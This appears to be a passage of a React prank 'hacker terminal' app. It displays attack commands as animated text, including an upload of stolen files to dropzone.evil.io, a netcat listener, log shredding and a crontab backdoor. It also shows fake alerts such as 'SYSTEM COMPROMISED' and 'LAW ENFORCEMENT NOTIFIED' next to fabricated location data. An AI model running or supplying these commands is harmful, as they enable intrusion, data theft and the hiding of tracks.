import { AnimatePresence, motion } from "motion/react";
import React, { useCallback, useEffect, useRef, useState } from "react";

// ─── Fake content pools ───────────────────────────────────────────────────────

const COMMANDS = [
  "nmap -sS -O 192.168.1.1",
  "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1",
  'sqlmap -u "http://target.local/login" --dbs',
  "aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture.cap",
  'msfconsole -q -x "use exploit/multi/handler"',
  "nc -lvnp 4444",
  "python3 reverse_shell.py --target 10.0.0.5",
  "./CVE-2024-0001.sh --payload /tmp/shell.elf",
  "hashcat -m 0 -a 0 hashes.txt rockyou.txt",
  "wireshark -i eth0 -k",
  "tcpdump -i any -w capture.pcap",
  "john --wordlist=/etc/passwords shadow.hash",
  "exploitdb search buffer overflow 2024",
  "metasploit> use auxiliary/scanner/portscan/tcp",
];

const FILES = [
  "/etc/passwd",
  "/etc/shadow",
  "/var/log/auth.log",
  "/var/log/syslog",
  "/root/.ssh/id_rsa",
  "/home/admin/.bash_history",
  "C:\\Windows\\System32\\config\\SAM",
  "C:\\Windows\\System32\\config\\SYSTEM",
  "/proc/self/environ",
  "/tmp/shell.elf",
  "/var/www/html/config.php",
  "/etc/nginx/nginx.conf",
];

const STATUSES = [
  "[OK]",
  "[BYPASSED]",
  "[ENCRYPTED]",
  "[DECRYPTED]",
  "[FAILED]",
  "[INJECTED]",
];
const STATUS_COLORS: Record<string, string> = {
  "[OK]": "neon-text",
  "[BYPASSED]": "neon-text",
  "[ENCRYPTED]": "amber-text",
  "[DECRYPTED]": "neon-text",
  "[FAILED]": "red-glow",
  "[INJECTED]": "amber-text",
};

const SYSTEM_MSGS = [
  "KERNEL BREACH DETECTED",
  "Injecting payload into ring0...",
  "Privilege escalation successful",
  "Firewall rules flushed",
  "ARP cache poisoned",
  "Rootkit installed → persistence established",
  "Exfiltrating data via DNS tunnel",
  "Memory dump in progress...",
  "Disabling antivirus signatures...",
  "Lateral movement initiated",
  "C2 server connection established",
  "Zero-day exploit loaded into memory",
];

const FLASH_MESSAGES: { text: string; color: "neon" | "red" }[] = [
  { text: "ACCESS GRANTED", color: "neon" },
  { text: "SYSTEM COMPROMISED", color: "red" },
  { text: "FIREWALL BYPASSED", color: "neon" },
  { text: "ROOT ACCESS OBTAINED", color: "red" },
  { text: "DATABASE EXFILTRATED", color: "red" },
  { text: "ENCRYPTION CRACKED", color: "neon" },
];

const PANEL_TITLES = [
  "[SYSTEM DIAGNOSTICS]",
  "[ACCESS LOGS]",
  "[CODE // FIREWALL_BYPASS]",
  "[NETWORK SCAN]",
  "[PAYLOAD INJECTOR]",
  "[NETWORK RADAR]",
];

const STORAGE_KEY = "hacker_terminal_saved_msgs";

const LOADER_WARNINGS = [
  { text: "⚠ WARNING: UNAUTHORIZED ACCESS DETECTED", color: "red" as const },
  { text: "⚠ WARNING: FIREWALL BREACH IN PROGRESS", color: "red" as const },
  { text: "⚠ WARNING: ENCRYPTING STOLEN DATA...", color: "amber" as const },
  { text: "⚠ WARNING: UPLOADING TO REMOTE SERVER...", color: "amber" as const },
  { text: "⚠ CRITICAL: COVER TRACKS INITIATED", color: "red" as const },
  {
    text: "⚠ CRITICAL: SYSTEM COMPROMISED — DO NOT CLOSE!",
    color: "red" as const,
  },
];

const LOADER_CMDS = [
  "root@attacker:~$ ./exfiltrate.sh --target localhost --port 443",
  "[+] Connecting to C2 server at 185.220.101.47:443...",
  "[+] TLS handshake complete. Session encrypted.",
  "root@attacker:~$ tar czf /tmp/loot.tar.gz /home /etc/passwd /var/www",
  "[+] Compressing 2,847 files... done (847 MB)",
  "root@attacker:~$ curl -s -T /tmp/loot.tar.gz https://dropzone.evil.io/upload",
  "[+] Uploading chunk 1/8 ... [████░░░░] 12.4 MB/s",
  "[+] Uploading chunk 2/8 ... [████████░░] 15.1 MB/s",
  "root@attacker:~$ shred -vzn 3 /var/log/auth.log",
  "[+] Overwriting logs... pass 1/3 complete",
  "root@attacker:~$ crontab -l | grep backdoor || (crontab -l; echo '@reboot /tmp/.bd') | crontab -",
  "[+] Persistence established. Backdoor installed.",
  "root@attacker:~$ history -c && echo 'Access complete'",
  "[+] Upload complete. 847 MB transferred successfully.",
];

// ─── Helpers ──────────────────────────────────────────────────────────────────

function randInt(min: number, max: number) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randItem<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)];
}

function randHex(len: number) {
  return `0x${Array.from({ length: len }, () =>
    Math.floor(Math.random() * 16)
      .toString(16)
      .toUpperCase(),
  ).join("")}`;
}

function randIp() {
  const prefixes = ["192.168", "10.0", "172.16"];
  const p = randItem(prefixes);
  return `${p}.${randInt(0, 255)}.${randInt(1, 254)}`;
}

function randProgress() {
  const pct = randInt(60, 100);
  const filled = Math.floor(pct / 10);
  const bar = "█".repeat(filled) + "░".repeat(10 - filled);
  return `Decrypting... ${bar} ${pct}%`;
}

type LineType =
  | "cmd"
  | "file"
  | "hex"
  | "sys"
  | "ip"
  | "progress"
  | "login"
  | "custom";

interface TermLine {
  id: number;
  text: string;
  status?: string;
  type: LineType;
}

interface SavedMessage {
  id: string;
  text: string;
  createdAt: number;
}

let lineIdCounter = 0;

function generateLine(panelIndex: number): TermLine {
  const types: LineType[] = [
    "cmd",
    "file",
    "hex",
    "sys",
    "ip",
    "progress",
    "login",
  ];
  const weights: LineType[][] = [
    ["sys", "sys", "cmd", "hex"],
    ["file", "file", "ip", "sys"],
    ["cmd", "cmd", "hex", "hex"],
    ["ip", "ip", "cmd", "sys"],
    ["cmd", "hex", "sys", "progress"],
    ["hex", "hex", "file", "login"],
  ];
  const pool = weights[panelIndex] ?? types;
  const type = randItem(pool);
  const id = lineIdCounter++;

  switch (type) {
    case "cmd":
      return { id, text: `root@cyber:~$ ${randItem(COMMANDS)}`, type };
    case "file": {
      const st = randItem(STATUSES);
      return { id, text: `Accessing ${randItem(FILES)}...`, status: st, type };
    }
    case "hex": {
      const from = randHex(6);
      const to = randHex(6);
      return { id, text: `${from} --> ${to}`, type };
    }
    case "sys":
      return { id, text: randItem(SYSTEM_MSGS), type };
    case "ip": {
      const ip = randIp();
      const st = randItem(STATUSES);
      return {
        id,
        text: `[${ip}] --> Bypassing firewall...`,
        status: st,
        type,
      };
    }
    case "progress":
      return { id, text: randProgress(), type };
    case "login":
      return {
        id,
        text: `root@target:~$ sudo su  →  ${randItem(STATUSES)}`,
        type,
      };
    default:
      return { id, text: "PROCESSING...", type };
  }
}

// ─── HackerLoader ─────────────────────────────────────────────────────────────

function HackerLoader() {
  const [progress, setProgress] = useState(0);
  const [visibleWarnings, setVisibleWarnings] = useState<number[]>([]);
  const [visibleCmds, setVisibleCmds] = useState<string[]>([]);
  const [bytes, setBytes] = useState(0);
  const [speed, setSpeed] = useState(0);
  const [fileCount, setFileCount] = useState(0);
  const [blinkRed, setBlinkRed] = useState(false);
  const cmdScrollRef = useRef<HTMLDivElement>(null);

  // Progress bar: fill over ~6s
  useEffect(() => {
    const startTime = Date.now();
    const duration = 6200;
    const frame = () => {
      const elapsed = Date.now() - startTime;
      const pct = Math.min(100, (elapsed / duration) * 100);
      setProgress(pct);
      if (pct < 100) requestAnimationFrame(frame);
    };
    requestAnimationFrame(frame);
  }, []);

  // Stats counter
  useEffect(() => {
    const interval = setInterval(() => {
      setBytes((b) => b + randInt(180000, 420000));
      setSpeed(Number.parseFloat((Math.random() * 12 + 4).toFixed(1)));
      setFileCount((f) => f + randInt(2, 9));
    }, 120);
    return () => clearInterval(interval);
  }, []);

  // Warnings: appear one by one every 800ms
  useEffect(() => {
    LOADER_WARNINGS.forEach((_, i) => {
      const t = setTimeout(
        () => {
          setVisibleWarnings((prev) => [...prev, i]);
        },
        400 + i * 820,
      );
      return () => clearTimeout(t);
    });
  }, []);

  // Terminal commands: stream in every 400ms
  useEffect(() => {
    LOADER_CMDS.forEach((cmd, i) => {
      const t = setTimeout(
        () => {
          setVisibleCmds((prev) => [...prev, cmd]);
          setTimeout(() => {
            if (cmdScrollRef.current) {
              cmdScrollRef.current.scrollTop =
                cmdScrollRef.current.scrollHeight;
            }
          }, 30);
        },
        300 + i * 420,
      );
      return () => clearTimeout(t);
    });
  }, []);

  // Blink effect for warnings
  useEffect(() => {
    const interval = setInterval(() => {
      setBlinkRed((b) => !b);
    }, 500);
    return () => clearInterval(interval);
  }, []);

  const formatBytes = (b: number) => {
    if (b < 1024 * 1024) return `${(b / 1024).toFixed(1)} KB`;
    return `${(b / (1024 * 1024)).toFixed(2)} MB`;
  };

  return (
    <motion.div
      key="hacker-loader"
      initial={{ opacity: 1 }}
      exit={{ opacity: 0, scale: 1.04 }}
      transition={{ duration: 0.6, ease: "easeInOut" }}
      data-ocid="loader.panel"
      style={{
        position: "fixed",
        inset: 0,
        zIndex: 200,
        background: "oklch(0.040 0.010 145)",
        fontFamily: "'JetBrains Mono', 'Courier New', monospace",
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
        justifyContent: "center",
        padding: "24px",
        gap: "0",
        overflow: "hidden",
      }}
    >
      {/* Scanline overlay */}
      <div
        style={{
          position: "absolute",
          inset: 0,
          backgroundImage:
            "repeating-linear-gradient(0deg, transparent, transparent 2px, oklch(0 0 0 / 0.08) 2px, oklch(0 0 0 / 0.08) 4px)",
          pointerEvents: "none",
          zIndex: 1,
        }}
      />

      {/* Corner brackets */}
      {(["top-left", "top-right", "bottom-left", "bottom-right"] as const).map(
        (pos) => (
          <div
            key={pos}
            style={{
              position: "absolute",
              width: "40px",
              height: "40px",
              top: pos.startsWith("top") ? "16px" : undefined,
              bottom: pos.startsWith("bottom") ? "16px" : undefined,
              left: pos.endsWith("left") ? "16px" : undefined,
              right: pos.endsWith("right") ? "16px" : undefined,
              borderTop: pos.startsWith("top")
                ? "2px solid oklch(0.62 0.22 25 / 0.8)"
                : undefined,
              borderBottom: pos.startsWith("bottom")
                ? "2px solid oklch(0.62 0.22 25 / 0.8)"
                : undefined,
              borderLeft: pos.endsWith("left")
                ? "2px solid oklch(0.62 0.22 25 / 0.8)"
                : undefined,
              borderRight: pos.endsWith("right")
                ? "2px solid oklch(0.62 0.22 25 / 0.8)"
                : undefined,
              pointerEvents: "none",
              zIndex: 2,
            }}
          />
        ),
      )}

      {/* Main content */}
      <div
        style={{
          position: "relative",
          zIndex: 2,
          width: "100%",
          maxWidth: "760px",
          display: "flex",
          flexDirection: "column",
          gap: "16px",
        }}
      >
        {/* Title */}
        <motion.div
          initial={{ opacity: 0, y: -20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.4 }}
          style={{ textAlign: "center" }}
        >
          <div
            style={{
              color: blinkRed ? "oklch(0.72 0.22 25)" : "oklch(0.65 0.22 25)",
              fontSize: "clamp(1rem, 3vw, 1.6rem)",
              fontWeight: "bold",
              letterSpacing: "0.25em",
              textShadow: blinkRed
                ? "0 0 30px oklch(0.72 0.22 25 / 0.9), 0 0 60px oklch(0.72 0.22 25 / 0.5)"
                : "0 0 15px oklch(0.65 0.22 25 / 0.6)",
              transition: "all 0.3s",
              marginBottom: "4px",
            }}
          >
            ⚠ TRANSFERRING DATA... DO NOT CLOSE ⚠
          </div>
          <div
            style={{
              color: "oklch(0.56 0.03 145)",
              fontSize: "0.6rem",
              letterSpacing: "0.2em",
            }}
          >
            UNAUTHORIZED ACCESS IN PROGRESS — SYSTEM BREACH ACTIVE
          </div>
        </motion.div>

        {/* Progress Bar + Percentage */}
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ delay: 0.3 }}
          style={{ display: "flex", flexDirection: "column", gap: "6px" }}
        >
          <div
            style={{
              display: "flex",
              justifyContent: "space-between",
              alignItems: "center",
            }}
          >
            <span
              style={{
                color: "oklch(0.62 0.22 25)",
                fontSize: "0.6rem",
                letterSpacing: "0.15em",
              }}
            >
              TRANSFER PROGRESS
            </span>
            <span
              style={{
                color: "oklch(0.85 0.22 145)",
                fontSize: "1rem",
                fontWeight: "bold",
                letterSpacing: "0.1em",
                textShadow: "0 0 10px oklch(0.85 0.22 145 / 0.7)",
              }}
            >
              {Math.floor(progress)}%
            </span>
          </div>
          {/* Progress track */}
          <div
            style={{
              width: "100%",
              height: "18px",
              background: "oklch(0.08 0.012 145)",
              border: "1px solid oklch(0.85 0.22 145 / 0.35)",
              position: "relative",
              overflow: "hidden",
            }}
          >
            <motion.div
              style={{
                position: "absolute",
                top: 0,
                left: 0,
                height: "100%",
                width: `${progress}%`,
                background:
                  "linear-gradient(90deg, oklch(0.62 0.22 25 / 0.8), oklch(0.72 0.22 25))",
                boxShadow: "0 0 12px oklch(0.72 0.22 25 / 0.7)",
                transition: "width 0.08s linear",
              }}
            />
            {/* Animated stripe */}
            <div
              style={{
                position: "absolute",
                inset: 0,
                backgroundImage:
                  "repeating-linear-gradient(90deg, transparent 0px, transparent 8px, oklch(0 0 0 / 0.15) 8px, oklch(0 0 0 / 0.15) 12px)",
                animation: "stripe-move 0.6s linear infinite",
              }}
            />
          </div>
        </motion.div>

        {/* Stats Row */}
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ delay: 0.4 }}
          style={{
            display: "grid",
            gridTemplateColumns: "repeat(3, 1fr)",
            gap: "8px",
          }}
        >
          {[
            { label: "BYTES TRANSFERRED", value: formatBytes(bytes) },
            { label: "TRANSFER SPEED", value: `${speed} MB/s` },
            { label: "FILES STOLEN", value: `${fileCount.toLocaleString()}` },
          ].map(({ label, value }) => (
            <div
              key={label}
              style={{
                background: "oklch(0.055 0.008 145)",
                border: "1px solid oklch(0.85 0.22 145 / 0.25)",
                padding: "8px 12px",
                textAlign: "center",
              }}
            >
              <div
                style={{
                  color: "oklch(0.56 0.03 145)",
                  fontSize: "0.5rem",
                  letterSpacing: "0.15em",
                  marginBottom: "4px",
                }}
              >
                {label}
              </div>
              <div
                style={{
                  color: "oklch(0.85 0.22 145)",
                  fontSize: "0.85rem",
                  fontWeight: "bold",
                  letterSpacing: "0.1em",
                  textShadow: "0 0 8px oklch(0.85 0.22 145 / 0.6)",
                }}
              >
                {value}
              </div>
            </div>
          ))}
        </motion.div>

        {/* Main two-column: warnings + terminal */}
        <div
          style={{
            display: "grid",
            gridTemplateColumns: "1fr 1fr",
            gap: "10px",
            minHeight: "0",
          }}
        >
          {/* Warnings column */}
          <motion.div
            initial={{ opacity: 0, x: -20 }}
            animate={{ opacity: 1, x: 0 }}
            transition={{ delay: 0.5 }}
            style={{
              background: "oklch(0.042 0.008 25)",
              border: "1px solid oklch(0.62 0.22 25 / 0.5)",
              padding: "10px",
              display: "flex",
              flexDirection: "column",
              gap: "0",
              minHeight: "150px",
            }}
          >
            <div
              style={{
                color: "oklch(0.62 0.22 25)",
                fontSize: "0.55rem",
                letterSpacing: "0.2em",
                borderBottom: "1px solid oklch(0.62 0.22 25 / 0.3)",
                paddingBottom: "6px",
                marginBottom: "8px",
              }}
            >
              ▶ SECURITY ALERTS
            </div>
            <div
              style={{ display: "flex", flexDirection: "column", gap: "5px" }}
            >
              <AnimatePresence>
                {LOADER_WARNINGS.map((w, i) =>
                  visibleWarnings.includes(i) ? (
                    <motion.div
                      key={w.text}
                      initial={{ opacity: 0, x: -10 }}
                      animate={{ opacity: 1, x: 0 }}
                      transition={{ duration: 0.3 }}
                      style={{
                        color:
                          w.color === "red"
                            ? blinkRed
                              ? "oklch(0.78 0.22 25)"
                              : "oklch(0.62 0.22 25)"
                            : blinkRed
                              ? "oklch(0.88 0.18 75)"
                              : "oklch(0.75 0.18 75)",
                        fontSize: "0.6rem",
                        letterSpacing: "0.04em",
                        textShadow:
                          w.color === "red"
                            ? "0 0 6px oklch(0.72 0.22 25 / 0.6)"
                            : "0 0 6px oklch(0.80 0.18 75 / 0.5)",
                        transition: "color 0.3s",
                        fontWeight: "bold",
                        lineHeight: "1.4",
                      }}
                    >
                      {w.text}
                    </motion.div>
                  ) : null,
                )}
              </AnimatePresence>
            </div>
          </motion.div>

          {/* Terminal column */}
          <motion.div
            initial={{ opacity: 0, x: 20 }}
            animate={{ opacity: 1, x: 0 }}
            transition={{ delay: 0.5 }}
            style={{
              background: "oklch(0.038 0.007 145)",
              border: "1px solid oklch(0.85 0.22 145 / 0.3)",
              padding: "10px",
              display: "flex",
              flexDirection: "column",
              minHeight: "150px",
            }}
          >
            <div
              style={{
                color: "oklch(0.85 0.22 145)",
                fontSize: "0.55rem",
                letterSpacing: "0.2em",
                borderBottom: "1px solid oklch(0.85 0.22 145 / 0.3)",
                paddingBottom: "6px",
                marginBottom: "8px",
                flexShrink: 0,
              }}
            >
              ▶ EXECUTING COMMANDS
            </div>
            <div
              ref={cmdScrollRef}
              style={{
                flex: 1,
                overflowY: "hidden",
                display: "flex",
                flexDirection: "column",
                gap: "3px",
              }}
            >
              {visibleCmds.map((cmd) => (
                <motion.div
                  key={cmd}
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                  transition={{ duration: 0.2 }}
                  style={{
                    color: cmd.startsWith("[+]")
                      ? "oklch(0.75 0.14 145)"
                      : "oklch(0.62 0.10 145)",
                    fontSize: "0.55rem",
                    lineHeight: "1.4",
                    whiteSpace: "nowrap",
                    overflow: "hidden",
                    textOverflow: "ellipsis",
                    fontWeight: cmd.startsWith("root@") ? "normal" : "normal",
                  }}
                >
                  {cmd}
                </motion.div>
              ))}
              {/* Blinking cursor */}
              <span
                style={{
                  display: "inline-block",
                  color: "oklch(0.85 0.22 145)",
                  animation: "blink 1s step-start infinite",
                  fontSize: "0.6rem",
                }}
              >
                ▮
              </span>
            </div>
          </motion.div>
        </div>

        {/* Bottom status */}
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ delay: 0.6 }}
          style={{
            display: "flex",
            justifyContent: "space-between",
            alignItems: "center",
            borderTop: "1px solid oklch(0.85 0.22 145 / 0.2)",
            paddingTop: "8px",
          }}
        >
          <span
            style={{
              color: "oklch(0.56 0.03 145)",
              fontSize: "0.5rem",
              letterSpacing: "0.1em",
            }}
          >
            TARGET: {randIp()} | ATTACKER: 185.220.101.47 | PORT: 443/TLS
          </span>
          <span
            style={{
              color: blinkRed
                ? "oklch(0.78 0.22 25)"
                : "oklch(0.62 0.22 25 / 0.7)",
              fontSize: "0.5rem",
              letterSpacing: "0.1em",
              transition: "color 0.3s",
              fontWeight: "bold",
            }}
          >
            ● BREACH ACTIVE
          </span>
        </motion.div>
      </div>
    </motion.div>
  );
}

// ─── PoliceTrackingPanel (Panel 0) ───────────────────────────────────────────

function PoliceTrackingPanel() {
  const [blink, setBlink] = React.useState(true);
  const [dotPos, setDotPos] = React.useState({ x: 50, y: 50 });
  const [lat, setLat] = React.useState(33.6844);
  const [lng, setLng] = React.useState(73.0479);
  const [progress, setProgress] = React.useState(0);
  const [scanY, setScanY] = React.useState(0);

  React.useEffect(() => {
    const blinkT = setInterval(() => setBlink((b) => !b), 500);
    return () => clearInterval(blinkT);
  }, []);

  React.useEffect(() => {
    const moveT = setInterval(() => {
      setDotPos((p) => ({
        x: Math.max(10, Math.min(90, p.x + (Math.random() - 0.5) * 4)),
        y: Math.max(10, Math.min(90, p.y + (Math.random() - 0.5) * 4)),
      }));
      setLat((v) =>
        Number.parseFloat((v + (Math.random() - 0.5) * 0.001).toFixed(4)),
      );
      setLng((v) =>
        Number.parseFloat((v + (Math.random() - 0.5) * 0.001).toFixed(4)),
      );
    }, 800);
    return () => clearInterval(moveT);
  }, []);

  React.useEffect(() => {
    const progT = setInterval(() => {
      setProgress((p) => (p >= 100 ? 0 : p + 0.8));
    }, 60);
    return () => clearInterval(progT);
  }, []);

  React.useEffect(() => {
    const scanT = setInterval(() => {
      setScanY((y) => (y >= 100 ? 0 : y + 1.5));
    }, 30);
    return () => clearInterval(scanT);
  }, []);

  return (
    <div
      className="panel-bg neon-border panel-pulse"
      style={{
        width: "100%",
        height: "100%",
        display: "flex",
        flexDirection: "column",
        overflow: "hidden",
        fontFamily: "'Courier New', monospace",
      }}
    >
      {/* Header */}
      <div
        style={{
          padding: "4px 8px",
          borderBottom: "1px solid rgba(200,0,0,0.4)",
          display: "flex",
          alignItems: "center",
          justifyContent: "space-between",
          flexShrink: 0,
        }}
      >
        <span
          style={{
            color: "#ff3333",
            fontSize: 11,
            fontWeight: 700,
            letterSpacing: 1,
          }}
        >
          [POLICE TRACKING]
        </span>
        <span
          style={{
            fontSize: 13,
            opacity: blink ? 1 : 0,
            transition: "opacity 0.1s",
          }}
        >
          🚨
        </span>
      </div>

      {/* Map area */}
      <div
        style={{
          flex: "0 0 55%",
          position: "relative",
          background: "#050a05",
          overflow: "hidden",
          borderBottom: "1px solid rgba(200,0,0,0.3)",
        }}
      >
        {/* Grid lines */}
        <svg
          width="100%"
          height="100%"
          style={{ position: "absolute", inset: 0 }}
          preserveAspectRatio="none"
          aria-label="Police tracking map grid"
          role="img"
        >
          {[10, 20, 30, 40, 50, 60, 70, 80, 90].map((v) => (
            <React.Fragment key={v}>
              <line
                x1={`${v}%`}
                y1="0%"
                x2={`${v}%`}
                y2="100%"
                stroke="rgba(0,180,0,0.12)"
                strokeWidth="0.5"
              />
              <line
                x1="0%"
                y1={`${v}%`}
                x2="100%"
                y2={`${v}%`}
                stroke="rgba(0,180,0,0.12)"
                strokeWidth="0.5"
              />
            </React.Fragment>
          ))}
          {/* Cross-hairs */}
          <line
            x1="50%"
            y1="0%"
            x2="50%"
            y2="100%"
            stroke="rgba(0,180,0,0.2)"
            strokeWidth="0.8"
            strokeDasharray="4,4"
          />
          <line
            x1="0%"
            y1="50%"
            x2="100%"
            y2="50%"
            stroke="rgba(0,180,0,0.2)"
            strokeWidth="0.8"
            strokeDasharray="4,4"
          />
        </svg>

        {/* Scan line */}
        <div
          style={{
            position: "absolute",
            left: 0,
            right: 0,
            top: `${scanY}%`,
            height: "2px",
            background:
              "linear-gradient(90deg, transparent, rgba(0,255,100,0.4), transparent)",
            pointerEvents: "none",
          }}
        />

        {/* Moving dot */}
        <div
          style={{
            position: "absolute",
            left: `${dotPos.x}%`,
            top: `${dotPos.y}%`,
            transform: "translate(-50%, -50%)",
            transition: "left 0.7s ease, top 0.7s ease",
          }}
        >
          {/* Pulsing ring */}
          <div
            style={{
              position: "absolute",
              width: 20,
              height: 20,
              borderRadius: "50%",
              border: "1.5px solid rgba(255,50,50,0.6)",
              top: "50%",
              left: "50%",
              transform: "translate(-50%, -50%)",
              animation: "ping 1.2s ease-out infinite",
            }}
          />
          <div
            style={{
              width: 8,
              height: 8,
              borderRadius: "50%",
              background: blink ? "#ff2222" : "#ff6666",
              boxShadow: "0 0 6px #ff0000, 0 0 12px rgba(255,0,0,0.5)",
            }}
          />
        </div>

        {/* Corner labels */}
        <span
          style={{
            position: "absolute",
            top: 3,
            left: 5,
            color: "rgba(0,200,0,0.5)",
            fontSize: 9,
            fontFamily: "monospace",
          }}
        >
          ISL
        </span>
        <span
          style={{
            position: "absolute",
            bottom: 3,
            right: 5,
            color: "rgba(0,200,0,0.5)",
            fontSize: 9,
            fontFamily: "monospace",
          }}
        >
          PKT
        </span>
      </div>

      {/* Info rows */}
      <div
        style={{
          flex: 1,
          display: "flex",
          flexDirection: "column",
          justifyContent: "space-between",
          padding: "4px 8px",
          overflow: "hidden",
        }}
      >
        <div style={{ color: "#aaa", fontSize: 10, lineHeight: 1.5 }}>
          <div>
            <span style={{ color: "rgba(0,200,0,0.7)" }}>LAT: </span>
            <span style={{ color: "#ff9900" }}>{lat.toFixed(4)}°N</span>
          </div>
          <div>
            <span style={{ color: "rgba(0,200,0,0.7)" }}>LNG: </span>
            <span style={{ color: "#ff9900" }}>{lng.toFixed(4)}°E</span>
          </div>
        </div>

        {/* Progress bar */}
        <div style={{ margin: "3px 0" }}>
          <div
            style={{
              height: 4,
              background: "rgba(255,255,255,0.08)",
              borderRadius: 2,
              overflow: "hidden",
            }}
          >
            <div
              style={{
                height: "100%",
                width: `${progress}%`,
                background: "linear-gradient(90deg, #cc0000, #ff4444)",
                borderRadius: 2,
                transition: "width 0.06s linear",
                boxShadow: "0 0 6px rgba(255,0,0,0.6)",
              }}
            />
          </div>
        </div>

        <div
          style={{
            color: blink ? "#ff3333" : "rgba(255,50,50,0.5)",
            fontSize: 10,
            fontWeight: 700,
            letterSpacing: 1,
            textAlign: "center",
            transition: "color 0.1s",
          }}
        >
          ⚠ LAW ENFORCEMENT NOTIFIED
        </div>
      </div>
    </div>
  );
}

// ─── LocationPanel (Panel 1) ──────────────────────────────────────────────────

function LocationPanel() {
  const [blink, setBlink] = React.useState(true);
  const [ip, setIp] = React.useState("203.128.24.91");
  const [lat, setLat] = React.useState(33.7294);
  const [lng, setLng] = React.useState(73.0931);
  const [dots, setDots] = React.useState(".");
  const [signalFrame, setSignalFrame] = React.useState(0);

  const ips = [
    "203.128.24.91",
    "182.191.88.14",
    "39.57.143.20",
    "115.186.1.99",
  ];

  React.useEffect(() => {
    const blinkT = setInterval(() => setBlink((b) => !b), 500);
    return () => clearInterval(blinkT);
  }, []);

  React.useEffect(() => {
    const ipT = setInterval(() => {
      setIp(ips[Math.floor(Math.random() * ips.length)]);
    }, 3500);
    return () => clearInterval(ipT);
  }, []);

  React.useEffect(() => {
    const coordT = setInterval(() => {
      setLat((v) =>
        Number.parseFloat((v + (Math.random() - 0.5) * 0.0002).toFixed(4)),
      );
      setLng((v) =>
        Number.parseFloat((v + (Math.random() - 0.5) * 0.0002).toFixed(4)),
      );
    }, 1000);
    return () => clearInterval(coordT);
  }, []);

  React.useEffect(() => {
    const dotsT = setInterval(() => {
      setDots((d) => (d.length >= 3 ? "." : `${d}.`));
    }, 400);
    return () => clearInterval(dotsT);
  }, []);

  React.useEffect(() => {
    const sigT = setInterval(() => {
      setSignalFrame((f) => (f + 1) % 4);
    }, 600);
    return () => clearInterval(sigT);
  }, []);

  const statusRows = [
    { label: "GPS", value: "LOCKED", color: "#00ff88" },
    { label: "CELL", value: "TRIANGULATED", color: "#00ff88" },
    { label: "IP GEOLOC", value: "CONFIRMED", color: "#00ff88" },
  ];

  return (
    <div
      className="panel-bg neon-border panel-pulse"
      style={{
        width: "100%",
        height: "100%",
        display: "flex",
        flexDirection: "column",
        overflow: "hidden",
        fontFamily: "'Courier New', monospace",
      }}
    >
      {/* Header */}
      <div
        style={{
          padding: "4px 8px",
          borderBottom: "1px solid rgba(255,150,0,0.4)",
          display: "flex",
          alignItems: "center",
          justifyContent: "space-between",
          flexShrink: 0,
        }}
      >
        <span
          style={{
            color: "#ff9900",
            fontSize: 11,
            fontWeight: 700,
            letterSpacing: 1,
          }}
        >
          [LOCATION DATA]
        </span>
        <span
          style={{
            fontSize: 13,
            opacity: blink ? 1 : 0,
            transition: "opacity 0.1s",
          }}
        >
          📍
        </span>
      </div>

      {/* Data rows */}
      <div
        style={{
          flex: 1,
          padding: "6px 8px",
          display: "flex",
          flexDirection: "column",
          gap: 3,
          overflow: "hidden",
        }}
      >
        <div style={{ fontSize: 10 }}>
          <span style={{ color: "rgba(0,200,0,0.6)" }}>IP ADDR: </span>
          <span style={{ color: "#ffcc00" }}>{ip}</span>
        </div>
        <div style={{ fontSize: 10 }}>
          <span style={{ color: "rgba(0,200,0,0.6)" }}>CITY: </span>
          <span style={{ color: "#fff" }}>Islamabad, PK</span>
        </div>
        <div style={{ fontSize: 10 }}>
          <span style={{ color: "rgba(0,200,0,0.6)" }}>LAT: </span>
          <span style={{ color: "#ff9900" }}>{lat.toFixed(4)}°N</span>
          <span style={{ color: "rgba(0,200,0,0.6)", marginLeft: 6 }}>
            LNG:{" "}
          </span>
          <span style={{ color: "#ff9900" }}>{lng.toFixed(4)}°E</span>
        </div>
        <div style={{ fontSize: 10 }}>
          <span style={{ color: "rgba(0,200,0,0.6)" }}>ISP: </span>
          <span style={{ color: "#ccc" }}>PTCL Broadband</span>
        </div>

        <div
          style={{
            height: 1,
            background: "rgba(255,150,0,0.2)",
            margin: "2px 0",
          }}
        />

        {statusRows.map((row) => (
          <div
            key={row.label}
            style={{
              display: "flex",
              justifyContent: "space-between",
              fontSize: 10,
            }}
          >
            <span style={{ color: "rgba(0,200,0,0.6)" }}>{row.label}:</span>
            <span style={{ color: row.color, fontWeight: 700 }}>
              ■ {row.value}
            </span>
          </div>
        ))}

        <div
          style={{
            height: 1,
            background: "rgba(255,150,0,0.2)",
            margin: "2px 0",
          }}
        />

        {/* Signal bars */}
        <div
          style={{
            display: "flex",
            alignItems: "flex-end",
            gap: 3,
            height: 18,
          }}
        >
          <span
            style={{ color: "rgba(0,200,0,0.6)", fontSize: 9, marginRight: 4 }}
          >
            SIG:
          </span>
          {[1, 2, 3, 4].map((bar) => (
            <div
              key={bar}
              style={{
                width: 6,
                height: bar * 4,
                background:
                  bar <= signalFrame + 1 ? "#00ff88" : "rgba(0,255,136,0.2)",
                borderRadius: 1,
                transition: "background 0.3s",
                boxShadow:
                  bar <= signalFrame + 1
                    ? "0 0 4px rgba(0,255,136,0.6)"
                    : "none",
              }}
            />
          ))}
          <span style={{ color: "#00ff88", fontSize: 9, marginLeft: 4 }}>
            STRONG
          </span>
        </div>
      </div>

      {/* Footer */}
      <div
        style={{
          padding: "4px 8px",
          borderTop: "1px solid rgba(255,50,50,0.3)",
          flexShrink: 0,
        }}
      >
        <span
          style={{
            color: blink ? "#ff3333" : "rgba(255,50,50,0.5)",
            fontSize: 10,
            fontWeight: 700,
            letterSpacing: 1,
            transition: "color 0.1s",
          }}
        >
          ▶ TRANSMITTING TO SERVER{dots}
        </span>
      </div>
    </div>
  );
}

// ─── GraphicPanel (Network Radar) ────────────────────────────────────────────

interface RadarNode {
  id: number;
  angle: number;
